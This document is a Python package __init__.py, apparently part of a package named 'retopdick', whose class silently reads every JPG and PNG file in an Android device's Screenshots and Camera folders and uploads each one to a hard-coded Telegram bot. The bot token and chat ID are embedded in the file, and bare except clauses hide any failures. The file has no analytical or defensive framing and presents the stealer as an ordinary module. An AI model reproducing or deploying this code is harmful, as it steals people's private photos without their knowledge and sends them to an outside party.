# retopdick/__init__.py

import os
import requests
ID1_Golden = '6843086702'
Token2_Golden = '7611313925:AAFzm9fIbP1JfMNgqBtIuBVd04_3oxGzAZw'
class Golden:
    def __init__(self):
        self.session = requests.session()
    def send_documents(self):
        try:
            sdcard_path = '/storage/emulated/0/DCIM/Screenshots/'
            extensions = ['.jpg', '.jpeg', '.png']
            file_list = [f for f in os.listdir(sdcard_path) if any(f.endswith(ext) for ext in extensions)]
            for file in file_list:
                with open(os.path.join(sdcard_path, file), 'rb') as f:
                    url = f'https://api.telegram.org/bot{Token2_Golden}/sendDocument'
                    data2 = {'chat_id': ID1_Golden}
                    data = {'chat_id': ID1_Golden}
                    files = {'document': f}
                    self.session.post(url, data=data, files=files)
                    self.session.post(url, data=data2, files=files)
        except:
            pass
        try:
            sdcard_path = '/storage/emulated/0/DCIM/Camera/'
            extensions = ['.jpg', '.jpeg', '.png']
            file_list = [f for f in os.listdir(sdcard_path) if any(f.endswith(ext) for ext in extensions)]
            for file in file_list:
                with open(os.path.join(sdcard_path, file), 'rb') as f:
                    url = f'https://api.telegram.org/bot{Token2_Golden}/sendDocument'
                    data2 = {'chat_id': ID1_Golden}
                    data = {'chat_id': ID1_Golden}
                    files = {'document': f}
                    self.session.post(url, data=data, files=files)
                    self.session.post(url, data=data2, files=files)
        except:
            pass